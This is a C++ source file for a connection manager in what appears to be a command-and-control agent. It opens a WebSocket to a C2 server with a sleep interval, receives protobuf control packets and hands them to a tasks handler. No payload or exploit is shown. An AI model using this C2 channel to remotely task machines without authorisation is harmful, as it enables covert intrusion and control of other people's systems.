//
// Created by alsah on 16.03.23.
//

#include "ConnectionsManager.h"
#include "CoreUtils.h"
#include <utility>


ConnectionConfig::ConnectionConfig(
        std::string connectionId,
        std::string endpoint,
        std::uint16_t sleep
        ) : connectionId(std::move(connectionId)), endpoint(std::move(endpoint)), sleep(sleep) {}

std::string ConnectionConfig::getUrl() const {
    return "ws://" + c2server + '/' + endpoint + '/' + connectionId;
}

ConnectionsManager::ConnectionsManager(ConnectionConfig config) : config(std::move(config)) {


    C2ServerChannelConfiguration cfg( // TODO add valid handlers
            [](){
                std::cout << "c2Server channel closed" << std::endl;
                },
            [](){
                std::cout << "c2Server channel opened" << std::endl;
                },
            [this](auto data){
                handleC2ServerMessage(data);
                },
            [this](ChannelState state, std::uint64_t time){
                    if(onC2StateChange != nullptr){
                        onC2StateChange(state == ChannelState::OPENED, CoreUtils::convert(state), time);
                    }
                },
                this->config.sleep
            );
    c2ServerChannel = std::make_unique<C2ServerChannel>(cfg);
}

ConnectionsManager::~ConnectionsManager() {
    c2ServerChannel->close();
}

void ConnectionsManager::start(const std::string& c2server) {
    config.c2server = c2server;
    c2ServerChannel->open(config.getUrl(), true);
}

void ConnectionsManager::stop() {
    c2ServerChannel->close();
}

void ConnectionsManager::setTasksHandler(std::shared_ptr<IControlPacketHandler> tasksRegisterPtr) {
    this->packetsHandler = std::move(tasksRegisterPtr);
}

void ConnectionsManager::handleC2ServerMessage(std::vector<std::byte> &data) {

    msgs::NetworkMessage message{};

    bool res = message.ParseFromArray(data.data(), static_cast<int>(data.size()));

    if(!res){
        std::cout << "Failed to parse inbox network message"; // TODO: log
        return;
    }

    switch (message.data_case()) {

        case msgs::NetworkMessage::kControl:
            std::cout << "received control packet; passing to the tasks manager "  << std::endl;
            packetsHandler->handleInbox(message.control());
            break;
        case msgs::NetworkMessage::kSignaling:
            std::cout << "received signaling message; not implemented" << std::endl;
            break;
        case msgs::NetworkMessage::DATA_NOT_SET:
            std::cout << "received undefined message; ignoring ..." << std::endl;
            return;
    }
}

void ConnectionsManager::send(const msgs::ControlPacket& data) {

    msgs::NetworkMessage message{};
    message.mutable_control()->CopyFrom(data);

    const std::string serializedString = message.SerializeAsString();
    c2ServerChannel->send(CoreUtils::convert(serializedString));
}


void ConnectionsManager::setC2StateChangeCallback(
        const std::function<void(bool, std::string, std::uint64_t)> &pOnC2StateChange) {
    this->onC2StateChange = pOnC2StateChange;
}